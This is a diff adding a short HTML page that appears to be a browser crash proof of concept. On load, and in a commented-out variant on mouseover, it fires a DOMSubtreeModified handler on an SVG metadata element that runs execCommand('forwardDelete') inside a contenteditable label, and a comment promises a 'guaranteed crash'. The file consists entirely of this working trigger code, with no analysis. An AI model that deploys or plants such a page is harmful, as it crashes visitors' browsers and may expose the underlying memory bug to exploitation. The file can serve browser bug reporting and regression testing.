@@ -1,0 +1,62 @@
+<!--For Guaranteed crash, you can also click :)-->
+<html>
+	<head>
+		<style>
+			:root { outline-bottom: none }
+		</style>
+		<script>
+			function event5(){
+				setTimeout(function(){eventhandler4();},600);
+			}
+			function eventhandler2() {
+				document.execCommand("forwardDelete", false);
+			}
+			function eventhandler4() {
+				var metaDataObject = document.createElementNS("http://www.w3.org/2000/svg", "metadata");
+				metaDataObject.addEventListener("DOMSubtreeModified", eventhandler2);
+				metaDataObject.setAttribute("pointsAtY", "0");
+			}
+		</script>
+	</head>
+	<body onload="event5()">
+		<a id="linkObject">
+			<ul>
+				<li>liObject</li>
+			</ul>
+		</a>
+		<label contenteditable="plaintext-only" low="1" autofocus="autofocus">
+			<datalist >dataList</datalist>
+		</label>
+</body>
+</html>
+
+<!--The above *might* not be as reliable as this one; however this would require a mouseover-->
+<!--
+<html>
+	<head>
+		<style>
+			:root { outline-bottom: none }
+		</style>
+		<script>
+			function eventhandler2() {
+				document.execCommand("forwardDelete", false);
+			}
+			function eventhandler4() {
+				var metaDataObject = document.createElementNS("http://www.w3.org/2000/svg", "metadata");
+				metaDataObject.addEventListener("DOMSubtreeModified", eventhandler2);
+				metaDataObject.setAttribute("pointsAtY", "0");
+			}
+		</script>
+	</head>
+	<body>
+		<a id="linkObject" onmouseover="eventhandler4()">
+			<ul>
+				<li>liObject</li>
+			</ul>
+		</a>
+		<label contenteditable="plaintext-only" low="1" autofocus="autofocus">
+			<datalist >dataList</datalist>
+		</label>
+</body>
+</html>
+-->
